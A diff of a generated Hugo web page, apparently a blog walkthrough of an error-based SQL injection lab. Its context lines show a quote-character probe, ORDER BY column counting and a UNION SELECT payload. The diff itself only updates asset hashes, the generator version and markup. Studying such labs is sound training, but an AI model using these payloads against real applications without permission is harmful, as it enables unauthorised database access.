@@ -20,10 +20,13 @@
 
 
 
-<script defer language="javascript" type="text/javascript" src="/js/bundle.min.7750550c0319f5de56d916b91e642bf72a5bd09ee50b201dc2ed9db69d6177a8.js"></script>
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.5991d603939a6d188be342b278a4555db90f163903158c623d2c39fde3d82cb3.js"></script>
 
 
 
+
+
+  
 
 
 
@@ -99,13 +102,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.149.0">
+<meta name="generator" content="Hugo 0.131.0">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.c5418c20c87786ca86a048c94829afd7a4878d46a40852faf7a3bb64f3dced4e.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.187ef09b40a995f4710437d48683184ae970c6540aa503dfba2c19d68efb84d9.css">
 
 
     
@@ -426,7 +429,8 @@
 ?id=1&#34;)
 </code></pre><p>If the application displays a <strong>database error message</strong></p>
 <blockquote>
-<p>Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use <strong>near &lsquo;&lsquo;1&rsquo;&rsquo; LIMIT 0,1&rsquo;</strong> at line 1</p></blockquote>
+<p>Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use <strong>near &lsquo;&lsquo;1&rsquo;&rsquo; LIMIT 0,1&rsquo;</strong> at line 1</p>
+</blockquote>
 <p>This indicates an <strong>Error-Based SQL Injection</strong>.</p>
 <p>In this lab, when an invalid character such as <code>'</code> (single quote) is added, the application responds with an SQL error.</p>
 <p>This confirms that the application is vulnerable to <strong>Error-Based SQL Injection (String)</strong>.</p>
@@ -486,7 +490,8 @@
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; ORDER BY 4 --+
 </span></span></span></code></pre></div><p>We will receive this error which mean we only have 3 columns</p>
 <blockquote>
-<p>Fatal error: Uncaught mysqli_sql_exception: Unknown column &lsquo;19&rsquo; in &lsquo;order clause&rsquo;</p></blockquote>
+<p>Fatal error: Uncaught mysqli_sql_exception: Unknown column &lsquo;19&rsquo; in &lsquo;order clause&rsquo;</p>
+</blockquote>
 <p>Now we&rsquo;ve 3 columns, so our payloads will look like this</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">?</span>id<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39; UNION SELECT 1,2,3 --+
 </span></span></span></code></pre></div><p><img src="/sqli-01/columnreflect.jpg" alt="Alt text"></p>
